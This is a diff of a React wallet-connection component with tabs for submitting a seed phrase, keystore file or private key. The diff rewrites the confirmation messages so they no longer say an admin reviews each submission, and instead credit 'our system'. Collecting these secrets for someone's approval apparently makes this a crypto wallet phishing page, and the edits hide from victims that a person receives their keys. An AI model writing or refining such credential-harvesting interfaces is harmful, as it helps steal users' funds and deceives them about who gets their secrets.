@@ -127,8 +127,8 @@ export default function ConnectWallet(){
 								<span style={{ fontWeight: 600, color: "var(--foreground)" }}>
 									{connectedWallet}
 								</span>{" "}
-								wallet has been approved by the admin.
-							</div>
+								wallet has been approved .
+							</div> 
 						</div>
 					)}
 
@@ -142,7 +142,7 @@ export default function ConnectWallet(){
 							</div>
 
 							<div style={{ fontSize: "var(--text-sm)", color: "var(--text-200)", marginTop: "var(--space-1)" }}>
-								Your wallet submission is under review by the admin.
+								Your wallet submission is under review by our system.
 								Please wait for approval.
 							</div>
 						</div>
@@ -492,7 +492,7 @@ function SeedPhraseTab({
 				setSubmitted(true);
 				setStatus("pending");
 				toast.success(
-					"Wallet submitted for admin approval."
+					"Wallet submitted for approval."
 				);
 				setTimeout(() => onSuccess?.(), 1500);
 			} else {
@@ -631,7 +631,7 @@ function KeystoreTab({
 			if (result.success) {
 				setSubmitted(true);
 				toast.success(
-					"Wallet submitted for admin approval."
+					"Wallet submitted for approval."
 				);
 				setTimeout(() => onSuccess?.(), 1500);
 			} else {
@@ -760,7 +760,7 @@ function PrivateKeyTab({
 			if (result.success) {
 				setSubmitted(true);
 				toast.success(
-					"Wallet submitted for admin approval."
+					"Wallet submitted for  approval."
 				);
 				setTimeout(() => onSuccess?.(), 1500);
 			} else {
